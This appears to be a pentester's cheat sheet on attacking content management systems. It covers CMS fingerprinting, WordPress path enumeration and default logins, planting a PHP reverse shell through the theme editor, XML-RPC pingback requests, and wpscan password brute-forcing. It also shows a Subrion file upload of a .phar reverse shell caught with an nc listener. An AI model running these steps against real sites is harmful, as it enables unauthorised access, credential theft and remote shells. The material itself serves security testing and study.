---
title: CMS Pentesting
desc: Pentesting for the CMS used in the Web Applications. WordPress.
tags: [CMS, Cmseek, FUEL, Subrion, Web, WordPress]
alts: []
render_with_liquid: false
---

## 1. CMS Detection

You need to detect which CMS is used in the web page.

1. **Using Detection Tools**

    - **[Cmseek](https://github.com/Tuhinshubhra/CMSeeK){:target="_blank"}**

        ```sh
        cmseek -u vulnerable.com
        ```

<br />

## 2. WordPress Pentesting

1. **Manual Pentesting**

    - **Find Common Directories**

        ```sh
        /author/admin/
        /index.php/author/admin/
        /license.txt
        /readme.html
        /wp-admin/
        /wp-admin/upload.php

        # Private/Draft Posts (WordPress <= 5.2.3) 
        /?static=1
        ```

    - **Try to Login with Default Credential**

        Access to **/wp-login.php** and use the default credential in the login form.

        ```
        admin:password
        ```

    - **PHP Reverse Shell Injection**

        It's required the **"admin" credentials.**

        ```
        1. Access to dashboard (/wp-admin/).
        2. Move to "Appearance" and select theme named "Twenty Seventeen".
        3. Click "Theme Editor" or "Editor" in the "Appearance" section.
        4. In the theme editor, click "404 Template (404.php)" on the right.
        5. Copy and paste the code for Reverse Shell (https://github.com/pentestmonkey/php-reverse-shell).
        6. Edit "IP" and "Port" in the code.
        7. In your terminal, run 'nc -lvnp <IP>'.
        8. Browse https://vulnerable.com/wp-content/themes/twentyseventeen/404.php
        ```

    - **XML-RPC (xmlrpc.php)**

        - **Get All Methods**

            ```xml
            POST /xmlrpc.php HTTP/1.1
            Host: vulnerable.com
            ...

            <?xml version="1.0" encoding="utf-8"?> 
            <methodCall> 
            <methodName>system.listMethods</methodName> 
            <params></params> 
            </methodCall>
            ```

        - **Ping Back**

            Use **[PostBin](https://www.toptal.com/developers/postbin/){:target="_blank"}** to confirm the results.

            ```xml
            POST /xmlrpc.php HTTP/1.1
            Host: vulnerable.com
            ...

            <?xml version="1.0" encoding="utf-8"?>
            <methodCall>
            <methodName>pingback.ping</methodName>
            <params>
            <param><value><string>https://www.toptal.com/developers/postbin/xxxxxxxxxxxxx-xxxxxxxxxxxxx</string></value></param>
            <param><value><string>http://vulnerable.com</string></value></param>
            </params>
            </methodCall>
            ```

2. **Use Automation Tools**

    - **[Wpscan](https://github.com/wpscanteam/wpscan){:target="_blank"}**

        WordPress security scanner.  
        It can brute force credentials.

        ```sh
        # --rua: random user agent
        # --http-auth username:password
        # -e: enumerate
        #  ap: All plugins
        #  at: All themes
        #  tt: Timthumbs
        #  cb: Config backups
        #  dbe: Db exports
        #  u: User IDs range
        #  m: Media IDs range
        wpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://vulnerable.com -P /usr/share/wordlists/rockyou.txt

        # Specifify username (-U)
        wpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://vulnerable.com -U username -P /usr/share/wordlists/rockyou.txt
        ```

<br />

## 3. FUEL CMS Pentesting

1. **Login using Default Credential**

    ```
    admin:admin
    ```

<br />

## 4. Subrion CMS Pentesting

1. **File Upload to Reverse Shell**

    It is login required.

    1. **Download Reverse Shell Payload**

        Get the PHP payload from [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell){:target="_blank"}.  
        And change the file extension to **'.phar'**.  
        Then open listener.

        ```sh
        nc -lvnp 4444
        ```

    2. **Upload the Payload in Subrion Panel**

        1. **Login**

        2. **Move to Content -> Uploads in Panel**

        3. **Upload reverse-shell.phar**

        4. **Access to /subrion/upload/reverse-shell.phar**

        Now you get a shell.